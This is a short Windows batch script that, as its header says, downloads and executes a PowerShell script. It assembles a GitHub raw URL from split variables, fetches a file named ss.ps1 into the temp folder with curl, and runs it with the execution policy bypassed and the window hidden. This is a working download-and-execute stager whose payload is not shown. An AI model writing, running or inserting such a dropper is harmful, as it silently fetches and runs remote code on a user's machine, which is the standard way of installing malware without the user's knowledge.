@echo off
setlocal enabledelayedexpansion

REM =============================================
REM Download and Execute PowerShell Script
REM =============================================

REM Build correct GitHub raw URL
set "a=https://raw.githubusercontent.com"
set "b=/Axolotl-in-void/powerhell/main/file.ps1"
set "url=%a%%b%"

echo Downloading script from GitHub...
curl -s -o "%TEMP%\ss.ps1" "%url%"

if %errorlevel% neq 0 (
    echo Failed to download the script.
    pause
    exit /b 1
)

echo Downloaded successfully.
echo Executing script...

REM Run the PowerShell script hidden
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\ss.ps1"

echo Script executed.
pause
